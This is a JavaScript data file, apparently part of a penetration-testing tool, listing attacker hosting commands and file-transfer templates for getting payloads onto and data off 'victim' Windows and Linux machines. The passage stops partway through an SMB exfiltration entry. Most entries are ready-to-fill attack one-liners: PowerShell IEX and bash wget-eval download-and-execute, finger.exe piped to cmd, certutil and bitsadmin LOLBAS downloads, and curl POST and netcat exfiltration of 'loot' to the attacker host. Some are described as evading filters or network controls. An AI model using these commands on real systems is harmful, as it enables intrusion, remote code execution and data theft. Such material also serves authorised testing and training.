// Global variables for application state
let currentDirection = 'ingest';

// =========================================================================
// --- DATABASE 1: CENTRAL HOSTING & ATTACKER DAEMON DATABASE ---
// =========================================================================
const hostingDatabase = [
    // --- WEB SERVERS ---
    { tech: "WEB", id: "python3", name: "Python 3 HTTP Server", defaultPort: "8000", template: "python3 -m http.server <PORT>" },
    { tech: "WEB", id: "python2", name: "Python 2 SimpleHTTPServer", defaultPort: "8000", template: "python -m SimpleHTTPServer <PORT>" },
    { tech: "WEB", id: "php", name: "PHP Built-in Server", defaultPort: "8000", template: "php -S <SRC_IP>:<PORT>" },
    { tech: "WEB", id: "perl", name: "Perl HTTP Server", defaultPort: "8000", template: "perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=><PORT>); $s->mount(\"\/\"=>{path=>\".\"}); $s->start'" },
    { tech: "WEB", id: "apache", name: "Apache2 Service", defaultPort: "80", template: "sudo cp <FILE> /var/www/html/\nsudo systemctl start apache2" },
    { tech: "WEB", id: "ruby_webrick", name: "Ruby WEBrick Server", defaultPort: "8080", template: "ruby -rwebrick -e \"WEBrick::HTTPServer.new(:Port => <PORT>, :DocumentRoot => Dir.pwd).start\"" },
    { tech: "WEB", id: "ruby_httpd", name: "Ruby httpd Server", defaultPort: "9000", template: "ruby -run -e httpd . -p <PORT>" },
    { tech: "WEB", id: "busybox_httpd", name: "Busybox httpd Server", defaultPort: "10000", template: "busybox httpd -f -p <PORT>" },
    // --- FTP SERVERS ---
    { tech: "FTP", id: "pyftpdlib", name: "Python pyftpdlib Server module", defaultPort: "21", template: "sudo python3 -m pyftpdlib -p <PORT> -w" },
    { tech: "FTP", id: "python_ftp_server_mod", name: "Python 3 python-ftp-server module", defaultPort: "21", template: "sudo python3 -m python_ftp_server -d \"$(pwd)\" -u \"user\" -p \"password\" --ip <SRC_IP> --port <PORT>" },
    { tech: "FTP", id: "pure_ftpd", name: "Pure-FTPd Service (Automated Setup)", defaultPort: "21", template: "echo '#!/bin/bash\nsudo groupadd ftpgroup\nsudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser\necho -e \"password\\npassword\" | sudo pure-pw useradd offsec -u ftpuser -d $(pwd)\nsudo pure-pw mkdb\ncd /etc/pure-ftpd/auth/\nsudo ln -sf ../conf/PureDB 60pdb\nsudo systemctl restart pure-ftpd' > setup-ftp.sh && chmod +x setup-ftp.sh && sudo ./setup-ftp.sh" },
    { tech: "FTP", id: "vsftpd", name: "VSFTPD Native Daemon", defaultPort: "21", template: "sudo apt update && sudo apt install vsftpd -y\nsudo systemctl start vsftpd" },
    
    // --- TFTP SERVERS ---
    { tech: "TFTP", id: "atftpd_daemon", name: "ATFTPD Native Daemon (Automated Setup)", defaultPort: "69", template: "sudo apt update && sudo apt install atftp -y && sudo mkdir -p /tftp && sudo chown nobody: /tftp && sudo cp <FILE> /tftp/ 2>/dev/null; sudo atftpd --daemon --port <PORT> /tftp" },

    // --- NETCAT & SOCAT ---
    { tech: "NETCAT", id: "nc_stream", name: "Netcat Inbound Connection Stream", defaultPort: "4444", template: "nc -nv <TGT_IP> <PORT> < <FILE>" },
    { tech: "SOCAT", id: "socat_listener", name: "Socat Active Multi-plex Listener", defaultPort: "443", template: "sudo socat TCP4-LISTEN:<PORT>,fork file:<FILE>" },
    
    // --- SMB SERVERS ---
    { tech: "SMB", id: "impacket", name: "Impacket SMB Server Suite (Linux Host)", defaultPort: "445", template: "sudo impacket-smbserver share $(pwd) -smb2support" },
    { tech: "SMB", id: "win_share", name: "Native Windows File Share (Windows Host)", defaultPort: "445", template: "mkdir c:\\\\temp\\\\transfer\nnet user guest /active:yes\nnet share transfer=c:\\\\temp\\\\transfer /GRANT:Everyone,FULL\n:: Verify share status:\nnet share" },
    
    // --- SSH & SCP DAEMONS ---
    { tech: "SSH", id: "ssh_daemon", name: "Native Linux SSH Daemon (systemctl)", defaultPort: "22", template: "sudo systemctl start ssh" },
    { tech: "SCP", id: "ssh_daemon", name: "Native Linux SSH Daemon (systemctl)", defaultPort: "22", template: "sudo systemctl start ssh" },
    { tech: "SSH", id: "win_ssh_daemon", name: "Native Windows OpenSSH Server (PowerShell)", defaultPort: "22", template: "PowerShell -c \"Start-Service sshd; Set-Service -Name sshd -StartupType 'Automatic'\"" },
    { tech: "SCP", id: "win_ssh_daemon", name: "Native Windows OpenSSH Server (PowerShell)", defaultPort: "22", template: "PowerShell -c \"Start-Service sshd; Set-Service -Name sshd -StartupType 'Automatic'\"" },
    
    // --- WEBDAV & FINGER ---
    { tech: "WEBDAV", id: "wsgidav", name: "WsgiDAV Python Server", defaultPort: "8080", template: "wsgidav --host=0.0.0.0 --port=<PORT> --root=. --auth=anonymous" },
    { tech: "FINGER", id: "nc_stream", name: "Netcat Raw Socket Content Server", defaultPort: "79", template: "nc -nv <TGT_IP> <PORT> < <FILE>" }
];

// =========================================================================
// --- DATABASE 2: CENTRAL TRANSFER PLATFORM METHOD DATABASE ---
// =========================================================================
const transferDatabase = [
    // --- WINDOWS INGESTION METHODS (DOWNLOADS) ---
    {
        tech: "WEB", id: "web_iex", name: "PowerShell - In-Memory Execution (IEX)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host the file", desc: "Start the selected web server module.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "In-Memory Load", desc: "Download and execute the script directly inside volatile memory.", type: "code", template: "iex(new-object net.webclient).downloadstring('http://<SRC_IP><PORT_URL>/<FILE>')" }
        ]
    },
    {
        tech: "WEB", id: "web_iex_iwr_modern", name: "PowerShell - In-Memory modern (IWR Alias)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host the payload", desc: "Ensure your selected web server module is running to serve the target file.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "In-Memory Load via WebRequest Alias", desc: "Leverage the modern Invoke-WebRequest (iwr) command alias to pull and instantly execute the script inside memory.", type: "code", template: "iex (iwr 'http://<SRC_IP><PORT_URL>/<FILE>')" }
        ]
    },
    {
        tech: "WEB", id: "web_iex_net_webrequest", name: "PowerShell - In-Memory raw .NET Stream (Bypass Framework)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host the script", desc: "Expose the malicious script over the active web engine container.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Execute non-standard .NET memory stream", desc: "Instantiate a raw WebRequest object structure to pull the remote payload stream and pipe it sequentially into IEX, evading standard command-line parameter filters.", type: "code", template: "$wr = [System.NET.WebRequest]::Create(\"http://<SRC_IP><PORT_URL>/<FILE>\"); $r = $wr.GetResponse(); IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()" }
        ]
    },
    {
        tech: "WEB", id: "web_downloadfile", name: "PowerShell - DownloadFile Method", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Start Webserver", desc: "Expose the payload via HTTP.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Download to disk", desc: "Retrieve the file onto the filesystem via the .NET WebClient class.", type: "code", template: "powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://<SRC_IP><PORT_URL>/<FILE>','C:\\Users\\Public\\Desktop\\<FILE>')\"" }
        ]
    },
    {
        tech: "WEB", id: "web_curl_win", name: "Curl (Windows Native Download)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host File", desc: "Fire up the HTTP listener.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Execute Curl Download", desc: "Leverage the built-in Windows curl binary to pull down the asset.", type: "code", template: "curl http://<SRC_IP><PORT_URL>/<FILE> -o <FILE>" }
        ]
    },
    {
        tech: "WEB", id: "web_certutil", name: "Certutil Ingestion (LOLBAS)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host Web Server", desc: "Ensure the file path is accessible over HTTP.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Certutil Download", desc: "Abuse the URL-cache split flag to discreetly pull down the binary.", type: "code", template: "certutil -urlcache -split -f http://<SRC_IP><PORT_URL>/<FILE> <FILE>" }
        ]
    },
    {
        tech: "WEB", id: "web_bitsadmin", name: "Bitsadmin Background Transfer", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host Web Server", desc: "Ensure Apache or another web server handles the request on port 80.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Bitsadmin Job", desc: "Create a low-profile file transfer job via the Background Intelligent Transfer Service.", type: "code", template: "bitsadmin /transfer wzd /priority high http://<SRC_IP><PORT_URL>/<FILE> C:\\Windows\\Tasks\\<FILE>" }
        ]
    },
    {
        tech: "WEB", id: "web_certreq", name: "Certreq Ingestion (Alternative HTTP LOLBAS)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host Web Server", desc: "Host the payload on your web server.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Certreq Download", desc: "Abuse certreq to send a download request and store the server response on disk.", type: "code", template: "certreq -Post -config http://<SRC_IP><PORT_URL>/<FILE> c:\\windows\\win.ini <FILE>" }
        ]
    },
    {
        tech: "WEB", id: "web_msedge_proxy", name: "Edge Proxy - Binary Ingestion (LOLBAS T1105)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host the payload", desc: "Ensure your selected web server module is running to serve the target file.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Download via Microsoft Edge Proxy", desc: "Abuse the legitimate msedge_proxy.exe binary to bypass network controls.", type: "code", template: "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe\" http://<SRC_IP><PORT_URL>/<FILE>" }
        ]
    },
    // --- LINUX INGESTION METHODS (DOWNLOADS) ---
    {
        tech: "WEB", id: "web_curl_linux_native", name: "Curl - Standard HTTP Ingestion ➔ Linux Target", os: "linux", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host the payload", desc: "Start your selected web server module to host the target file.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Execute Curl Download", desc: "Leverage native curl to pull down the asset.", type: "code", template: "curl http://<SRC_IP><PORT_URL>/<FILE> -o <FILE>" }
        ]
    },
    {
        tech: "WEB", id: "web_wget_recursive", name: "Wget - Recursive Directory Download ➔ Linux Target", os: "linux", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host the payload structure", desc: "Make sure your web server is running and the target directory structure is accessible.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Recursive Wget Download", desc: "Download the entire directory recursively without ascending to the parent directory.", type: "code", template: "wget -r -np --wait=1 -k http://<SRC_IP><PORT_URL>/" }
        ]
    },
    {
        tech: "WEB", id: "web_axel_linux", name: "Axel - Multi-threaded Download Accelerator ➔ Linux Target", os: "linux", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host the payload", desc: "Start the web server to handle multiple parallel download connections.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Accelerated Download via Axel", desc: "Use axel with multiple connections (-n 20) to accelerate the file transfer.", type: "code", template: "axel -a -n 20 -o <FILE> http://<SRC_IP><PORT_URL>/<FILE>" }
        ]
    },
    {
        tech: "WEB", id: "web_linux_in_memory", name: "Bash - In-Memory One-Liner Execution ➔ Linux Target", os: "linux", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host the script", desc: "Ensure the web server is ready to stream the malicious bash script.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "In-Memory Load and Eval", desc: "Stream the script into a variable via wget without writing to disk, then immediately execute it using eval.", type: "code", template: "bash -c \"CMD=\\`wget -qO- http://<SRC_IP><PORT_URL>/<FILE>\\`\" && eval \"$CMD\"" }
        ]
    },
    {
        tech: "WEB", id: "web_python_urllib", name: "Python - Urllib Inline Ingestion ➔ Linux Target", os: "linux", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host the payload", desc: "Start your selected web server module to host the target binary file.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Download via Python 3", desc: "Leverage Python 3's urllib request module to download the payload straight to the target folder.", type: "code", template: "python3 -c \"import urllib.request; urllib.request.urlretrieve('http://<SRC_IP><PORT_URL>/<FILE>', '/tmp/<FILE>')\"" }
        ]
    },
    // --- BASE64 INGESTION ---
    {
        tech: "BASE64", id: "b64_linux_to_linux", name: "Linux Host ➔ Linux Target (Base64 Stream)", os: "linux", direction: "ingest",
        steps: [
            { role: "attacker", title: "Encode file on Linux host", desc: "Convert the target binary file into a clean base64 string.", type: "code", template: "cat <FILE> | base64" },
            { role: "info", title: "Copy the payload string", desc: "Copy the generated base64 output from your attacker terminal.", type: "info" },
            { role: "target", title: "Decode payload on target", desc: "Pipe the base64 string back into an executable file on the victim machine.", type: "code", template: "echo 'BASE64_CODE_HERE' | base64 -d > <FILE>\nchmod +x <FILE>" }
        ]
    },
    {
        tech: "BASE64", id: "b64_linux_to_windows_ps", name: "Linux Host ➔ Windows Target (PowerShell)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Encode file on Linux host", desc: "Convert the binary to a single-line Base64 string with no line wraps.", type: "code", template: "base64 -w 0 <FILE>" },
            { role: "target", title: "Decode via PowerShell", desc: "Convert the string back to a byte array and save it directly onto disk.", type: "code", template: "[System.IO.File]::WriteAllBytes('C:\\Windows\\Tasks\\<FILE>', [Convert]::FromBase64String('BASE64_CODE_HERE'))" }
        ]
    },
    {
        tech: "BASE64", id: "b64_linux_to_windows_cert", name: "Linux Host ➔ Windows Target (Certutil)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Encode file with Certutil headers", desc: "Wrap the base64 output inside standard certificate formatting blocks required by certutil.", type: "code", template: "echo \"-----BEGIN CERTIFICATE-----\" > cert.b64 && base64 <FILE> >> cert.b64 && echo \"-----END CERTIFICATE-----\" >> cert.b64 && cat cert.b64" },
            { role: "target", title: "Decode via Certutil", desc: "Save the text as cert.b64 on the victim machine and decode it back into the target binary.", type: "code", template: "certutil -decode cert.b64 <FILE>" }
        ]
    },
    // --- SCP & SSH INGESTION ---
    {
        tech: "SCP", id: "scp_linux", name: "SCP Transfer ➔ Linux Target", os: "linux", direction: "ingest",
        steps: [
            { role: "target", title: "Start SSH Service on Target", desc: "Ensure the SSH service daemon is active on the victim machine.", type: "code", template: "sudo systemctl start ssh" },
            { role: "attacker", title: "Execute SCP from Attacker Machine", desc: "Push the file securely to the target over the SCP protocol.", type: "code", template: "scp <FILE> root@<TGT_IP>:/tmp/<FILE>" }
        ]
    },
    {
        tech: "SSH", id: "ssh_linux_pipe_client_mode", name: "SSH - Native Linux Client Data Stream (Attacker is Host)", os: "linux", direction: "ingest",
        steps: [
            { role: "attacker", title: "Activate SSH Server on Attacker Host", desc: "Ensure your attacker machine is listening for inbound SSH connections.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Stream Payload via SSH Pipe", desc: "Authenticate from the victim back to the attacker and pipe the output stream into a local file.", type: "code", template: "ssh <SSH_USER>@<SRC_IP> \"cat /path/to/<FILE>\" > /tmp/<FILE>" }
        ]
    },
    {
        tech: "SSH", id: "ssh_windows_ingest_client_mode", name: "SSH - Native Windows Client Data Stream (Attacker is Host)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Activate SSH Server on Attacker Host", desc: "Ensure your attacker machine is listening for inbound SSH connections.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Stream File via Native Windows SSH Client", desc: "Abuse the built-in Windows ssh.exe client to connect back to the attacker, cat the remote file, and stream it locally.", type: "code", template: "ssh <SSH_USER>@<SRC_IP> \"cat /path/to/<FILE>\" > C:\\Users\\Public\\<FILE>" }
        ]
    },
    {
        tech: "SCP", id: "scp_windows_ingest_server_mode", name: "SCP - Native Windows Server Ingestion (Victim is Host)", os: "windows", direction: "ingest",
        steps: [
            { role: "target", title: "Install and start OpenSSH Server on Windows Target", desc: "Enable the Windows SSH feature and open port 22 to allow the attacker to connect.", type: "code", template: "PowerShell -c \"Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Start-Service sshd; New-NetFirewallRule -Name 'SSH' -DisplayName 'SSH' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 22\"" },
            { role: "attacker", title: "Push Payload via SCP from Attacker Machine", desc: "Connect from your control environment directly to the victim's server to drop the file.", type: "code", template: "scp <FILE> Administrator@<TGT_IP>:C:/Users/Public/<FILE>" }
        ]
    },
    // --- NETCAT INGESTION ---
    {
        tech: "NETCAT", id: "nc_windows", name: "Netcat Raw Pipe ➔ Windows Target", os: "windows", direction: "ingest",
        steps: [
            { role: "target", title: "Open Listener on Windows", desc: "Open the destination port on the Windows target environment to catch the incoming file byte stream.", type: "code", template: "nc.exe -nlvp <PORT> > <FILE>" },
            { role: "attacker", title: "Push Binary from Attacker Host", desc: "Connect back from Kali and pipe the requested asset across the raw network socket.", type: "code", template: "nc -nv <TGT_IP> <PORT> < <FILE>" }
        ]
    },
    {
        tech: "NETCAT", id: "nc_windows_kali_resources", name: "Netcat Raw Pipe ➔ Windows Target (Kali Resources Pivot)", os: "windows", direction: "ingest",
        steps: [
            { role: "target", title: "Open Listener for Ingestion", desc: "Prepare the Windows target to write the raw bytes directly into the local target file path.", type: "code", template: "nc.exe -nlvp <PORT> > <FILE>" },
            { role: "attacker", title: "Push Binary from Kali Resources", desc: "Leverage Kali's native windows-resources storage directory to pipe down the pre-compiled windows binary dynamically.", type: "code", template: "nc -nv <TGT_IP> <PORT> < /usr/share/windows-resources/binaries/<FILE>" }
        ]
    },
    {
        tech: "NETCAT", id: "nc_linux", name: "Netcat Raw Pipe ➔ Linux Target", os: "linux", direction: "ingest",
        steps: [
            { role: "target", title: "Open Listener on Linux", desc: "Open the inbound port on the target machine and direct the stream to the temp folder.", type: "code", template: "nc -nlvp <PORT> > /tmp/<FILE>" },
            { role: "attacker", title: "Push Binary from Attacker Host", desc: "Stream the target executable file directly out of the current working terminal console.", type: "code", template: "nc -nv <TGT_IP> <PORT> < <FILE>" }
        ]
    },
    {
        tech: "NETCAT", id: "nc_wsl_tcp", name: "WSL Bash - Raw TCP Socket Ingestion (LOLBAS T1105)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host the payload via Netcat", desc: "Open a raw Netcat outbound connection stream to push the binary file over the specified port.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Reconstruct file via WSL Bash", desc: "Abuse wsl.exe to open a native Linux bash TCP socket on the Windows target and pipe the stream directly into a file.", type: "code", template: "wsl.exe --exec bash -c 'cat < /dev/tcp/<SRC_IP>/<PORT> > <FILE>'" }
        ]
    },
    // --- SOCAT INGESTION ---
    {
        tech: "SOCAT", id: "socat_windows", name: "Socat File Socket ➔ Windows Target", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Start Socat Listener", desc: "Bind the target payload file into an active listening socat pipeline socket.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Fetch File via Windows Socket", desc: "Connect back and initialize the byte stream container directly into an local file.", type: "code", template: "socat TCP4:<SRC_IP>:<PORT> file:<FILE>,create" }
        ]
    },
    {
        tech: "SOCAT", id: "socat_linux", name: "Socat File Socket ➔ Linux Target", os: "linux", direction: "ingest",
        steps: [
            { role: "attacker", title: "Start Socat Listener", desc: "Expose the deployment file over a raw socat socket connection.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Fetch File via Linux Socket", desc: "Download the asset over the raw socket path into the filesystem directory.", type: "code", template: "socat TCP4:<SRC_IP>:<PORT> file:/tmp/<FILE>,create" }
        ]
    },
    // --- SMB INGESTION ---
    {
        tech: "SMB", id: "smb_windows", name: "SMB - Impacket Share (Linux Attacker)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Expose Impacket Share on Kali", desc: "Spin up a local network share directly out of your current working directory on Kali.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Copy via UNC Path on Windows", desc: "Execute native copy syntax using a remote network share path definition string to pull the file.", type: "code", template: "copy \\\\<SRC_IP>\\share\\<FILE> C:\\Users\\Public\\<FILE>" }
        ]
    },
    {
        tech: "SMB", id: "smb_replace_lolbas", name: "SMB - Replace Ingestion (LOLBAS T1105)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Expose SMB Share", desc: "Set up the selected SMB share module on your attacker machine.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Replace execution (MITRE T1105)", desc: "Leverage replace.exe to discreetly copy the executable to a target folder via SMB.", type: "code", template: "replace.exe \\\\<SRC_IP>\\share\\<FILE> C:\\Windows\\Temp\\Folder /A" }
        ]
    },
    {
        tech: "SMB", id: "smb_windows_native_share_win_host", name: "SMB - Native Windows Admin Share (Windows Attacker/Pivot)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Create the Local File Share (Requires Admin)", desc: "Initialize the local Windows share using native operating system commands.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Copy File from the Attacker Share", desc: "Execute this on the victim machine to pull the payload directly from the newly created Windows share path.", type: "code", template: "copy \\\\<SRC_IP>\\transfer\\<FILE> C:\\Windows\\Tasks\\<FILE>" }
        ]
    },
    {
        tech: "SMB", id: "smb_linux", name: "SMB Mount / Client ➔ Linux Target", os: "linux", direction: "ingest",
        steps: [
            { role: "attacker", title: "Start SMB Share", desc: "Initialize the SMB server daemon inside your payload delivery folder.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Smbclient Ingestion on Linux", desc: "Authenticate non-interactively using smbclient to download the deployment binary.", type: "code", template: "smbclient //<SRC_IP>/share -N -c 'get <FILE> /tmp/<FILE>'" }
        ]
    },
    // --- FTP INGESTION ---
    {
        tech: "FTP", id: "ftp_non_interactive_win", name: "FTP - Non-Interactive Script Ingestion ➔ Windows Target", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Start FTP Server", desc: "Ensure your selected FTP backend daemon is running.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Create Transfer Script", desc: "Echo the FTP control commands non-interactively into a static configuration file.", type: "code", template: "echo open <SRC_IP> <PORT> > ftp.txt\necho offsec >> ftp.txt\necho password >> ftp.txt\necho bin >> ftp.txt\necho get <FILE> >> ftp.txt\necho bye >> ftp.txt" },
            { role: "target", title: "Execute Scripted Transfer", desc: "Abuse the native Windows FTP binary with the macro switch (-s) to download the file without prompt interaction.", type: "code", template: "ftp -i -s:ftp.txt\ndel ftp.txt" }
        ]
    },
    {
        tech: "FTP", id: "ftp_linux_wget_style", name: "FTP - Native Anonymous/Credentialed Pull ➔ Linux Target", os: "linux", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host via FTP", desc: "Initialize your chosen hosting framework module.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Ingest using Browser/Wget Stream", desc: "Leverage standard Linux binaries like wget to seamlessly log in and extract the payload over FTP protocol lines.", type: "code", template: "wget ftp://offsec:password@<SRC_IP>:<PORT>/<FILE> -O /tmp/<FILE>" }
        ]
    },
    {
        tech: "FTP", id: "ftp_linux_pure_bash", name: "FTP - Non-Interactive Heredoc Transfer ➔ Linux Target", os: "linux", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host payload via FTP", desc: "Run your selected FTP platform service.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Execute Bash Heredoc Download", desc: "Pipe an inline configuration sequence straight into the interactive ftp binary to fetch your file without human typing.", type: "code", template: "ftp -nv <SRC_IP> <PORT> <<EOF\nuser offsec password\nbinary\nget <FILE> /tmp/<FILE>\nquit\nEOF" }
        ]
    },
    // --- INTERACTIVE DESKTOP & C2 INGESTION ---
    {
        tech: "RDP", id: "rdp_gui", name: "RDP Native Clipboard Copy / Drive Redirection", os: "any", direction: "ingest",
        steps: [
            { role: "info", title: "RDP Clipboard Ingestion", desc: "Connect via xfreerdp or mstsc with clipboard synchronization enabled (+clipboard). Copy the binary on your attacker host and paste it directly into the active target desktop session.", type: "info" },
            { role: "attacker", title: "Mount Attacker Drive via CLI", desc: "Alternatively, spin up xfreerdp with a mounted local resource directory map.", type: "code", template: "xfreerdp /v:<TGT_IP> /u:administrator /p:Password123 /drive:kali,/tmp/" },
            { role: "target", title: "Access Mounted Drive on Target", desc: "Open File Explorer or use CMD to pull from the mapped network location.", type: "code", template: "copy \\\\tsclient\\kali\\<FILE> C:\\Windows\\Tasks\\<FILE>" }
        ]
    },
    {
        tech: "EVIL-WINRM", id: "winrm_upload", name: "Evil-WinRM Active Session Transfer", os: "windows", direction: "ingest",
        steps: [
            { role: "target", title: "Upload payload via active session", desc: "Execute this command directly inside your active Evil-WinRM shell console window.", type: "code", template: "upload /path/to/local/<FILE> ." }
        ]
    },
    {
        tech: "METASPLOIT", id: "msf_upload_win", name: "Meterpreter Session Transfer ➔ Windows Target", os: "windows", direction: "ingest",
        steps: [
            { role: "target", title: "Upload via active Meterpreter Shell", desc: "Use the built-in upload command within your existing session context.", type: "code", template: "upload /path/to/local/<FILE> C:\\Windows\\Tasks\\<FILE>" }
        ]
    },    
    {
        tech: "WEBDAV", id: "webdav_type", name: "WebDAV - Type Stream Execution (LOLBAS)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Start WebDAV Server on Kali", desc: "Expose the current deployment folder over a standard WebDAV pipeline context.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Download via Type Stream (MITRE T1105)", desc: "Abuse the native type binary operator string to channel the payload securely over the WebDAV endpoint.", type: "code", template: "type \\\\<SRC_IP>@<PORT>\\DavWWWRoot\\<FILE> > C:\\Windows\\Tasks\\<FILE>" }
        ]
    },
    {
        tech: "FINGER", id: "finger_lolbas", name: "Finger - Command Execution Stream (LOLBAS T1105)", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host payload via Python Netcat", desc: "Since finger utilizes raw socket streams, set up a netcat listener to supply your binary or script content.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Download and execute via Finger (MITRE T1105)", desc: "Abuse finger.exe to pull a malicious file structure stream from your server and pipe it straight into execution.", type: "code", template: "finger user@<SRC_IP> | more +2 | cmd" }
        ]
    },
    // --- TFTP INGESTION METHODS (DOWNLOADS) ---
    {
        tech: "TFTP", id: "tftp_win_ingest", name: "TFTP - Native Ingestion One-Liner ➔ Windows Target", os: "windows", direction: "ingest",
        steps: [
            { role: "attacker", title: "Start ATFTP Server", desc: "Initialize the ATFTP daemon on Kali exposing the folder /tftp.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Execute TFTP Download", desc: "Abuse the native Windows tftp client binary with the octet/binary switch (-i) to pull the asset.", type: "code", template: "tftp -i <SRC_IP> GET <FILE>" }
        ]
    },
    {
        tech: "TFTP", id: "tftp_linux_ingest", name: "TFTP - Interactive Non-Blocking Script ➔ Linux Target", os: "linux", direction: "ingest",
        steps: [
            { role: "attacker", title: "Host via TFTP", desc: "Initialize your chosen ATFTP hosting framework module.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Execute Scripted Transfer", desc: "Automate the interactive session using a standard bash heredoc wrapper to bypass typing prompts.", type: "code", template: "tftp <SRC_IP> <PORT> <<EOF\nbinary\nget <FILE>\nquit\nEOF" }
        ]
    },
    // =========================================================================
    // --- WINDOWS & LINUX EXFILTRATION METHODS (UPLOADS) ---
    // =========================================================================
    {
        tech: "WEB", id: "web_python_urllib_exfil", name: "Python - Inline HTTP POST Exfiltration", os: "linux", direction: "exfil",
        steps: [
            { role: "attacker", title: "Start Python Simple HTTP / Upload Handler", desc: "Host a basic server or use an adjusted python script listener to receive data on your control machine.", type: "code", template: "python3 -m http.server <PORT>" },
            { role: "target", title: "Exfiltrate via HTTP POST/Curl request", desc: "Send local loot via a standard POST request or curl back to the listener.", type: "code", template: "curl -X POST -T /tmp/<FILE> http://<SRC_IP><PORT_URL>/upload" }
        ]
    },
    {
        tech: "BASE64", id: "b64_linux_exfil", name: "Linux Host ➔ Linux Target (Base64 Stream)", os: "linux", direction: "exfil",
        steps: [
            { role: "target", title: "Encode sensitive file on target", desc: "Convert the target file to base64 on the victim system to preserve terminal encoding parameters.", type: "code", template: "cat /tmp/<FILE> | base64 -w 0" },
            { role: "info", title: "Copy encoded stream", desc: "Copy the base64 string from your target terminal output window manually.", type: "info" },
            { role: "attacker", title: "Decode back on Kali host", desc: "Reconstruct the original raw file on your local attacker workspace environment cleanly.", type: "code", template: "echo 'BASE64_CODE_HERE' | base64 -d > exfil_<FILE>" }
        ]
    },
    {
        tech: "NETCAT", id: "nc_linux_exfil", name: "Netcat Raw Pipe ➔ Linux Target", os: "linux", direction: "exfil",
        steps: [
            { role: "attacker", title: "Open Listener on Kali Host", desc: "Open an inbound listener socket on your control machine to catch exfiltrated sensitive files.", type: "code", template: "nc -nlvp <PORT> > caught_<FILE>" },
            { role: "target", title: "Stream File back to Attacker", desc: "Connect back to Kali from the target system and pipe the contents of the target asset into the connection network stream.", type: "code", template: "nc -nv <SRC_IP> <PORT> < /tmp/<FILE>" }
        ]
    },
    {
        tech: "NETCAT", id: "nc_windows_exfil", name: "Netcat Raw Pipe ➔ Windows Target", os: "windows", direction: "exfil",
        steps: [
            { role: "attacker", title: "Open Inbound Listener on Kali", desc: "Spin up a netcat background stream catch container within your desktop session.", type: "code", template: "nc -nlvp <PORT> > caught_<FILE>" },
            { role: "target", title: "Stream Windows Loot Back", desc: "Abuse local command prompt access parameters to push binary or text artifacts directly across raw TCP lines.", type: "code", template: "nc.exe -nv <SRC_IP> <PORT> < <FILE>" }
        ]
    },
    // --- SMB EXFILTRATION ---
    {
        tech: "SMB", id: "smb_windows_exfil", name: "SMB - Impacket Share Exfiltration (Linux Attacker)", os: "windows", direction: "exfil",
        steps: [
            { role: "attacker", title: "Start Impacket SMB Server with Write Access", desc: "Launch impacket-smbserver on Kali and make sure it has permissions to accept incoming files.", type: "code", template: "sudo impacket-smbserver share $(pwd) -smb2support" },
